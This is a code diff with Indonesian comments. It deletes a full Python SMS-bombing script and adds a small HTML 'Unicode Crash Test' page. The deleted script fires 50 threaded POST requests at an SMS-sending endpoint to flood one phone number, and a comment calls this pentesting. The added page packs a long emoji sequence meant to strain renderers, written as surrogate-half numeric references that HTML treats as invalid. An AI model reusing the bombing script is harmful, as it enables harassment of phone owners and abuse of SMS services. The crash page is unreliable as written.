@@ -1,36 +1,13 @@
-import requests
-import threading
-
-# Konfigurasi target (ganti dengan endpoint sah untuk pentesting)
-url = "https://example.com/api/send_sms"
-phone_number = "+6281234567890"
-
-# Payload
-data = {
-    "phone": phone_number
-}
-
-# Headers (jika dibutuhkan)
-headers = {
-    "Content-Type": "application/json",
-    "User-Agent": "Mozilla/5.0"
-}
-
-def send_sms():
-    try:
-        response = requests.post(url, json=data, headers=headers)
-        print(f"Status: {response.status_code}, Response: {response.text}")
-    except Exception as e:
-        print(f"Error: {e}")
-
-# Jumlah request yang ingin dikirim (ubah sesuai kebutuhan pengujian)
-jumlah_bom = 50
-
-threads = []
-for _ in range(jumlah_bom):
-    t = threading.Thread(target=send_sms)
-    threads.append(t)
-    t.start()
-
-for t in threads:
-    t.join()
+<!-- Simulasi page yang bisa dipakai untuk tes rendering aneh -->
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Unicode Crash Test</title>
+</head>
+<body>
+  <p>
+    &#xD83D;&#xDC69;&#x200D;&#xD83D;&#xDC69;&#x200D;&#xD83D;&#xDC66;&#x200D;&#xD83D;&#xDC66; <!-- Kombinasi emoji keluarga panjang -->
+  </p>
+</body>
+</html>
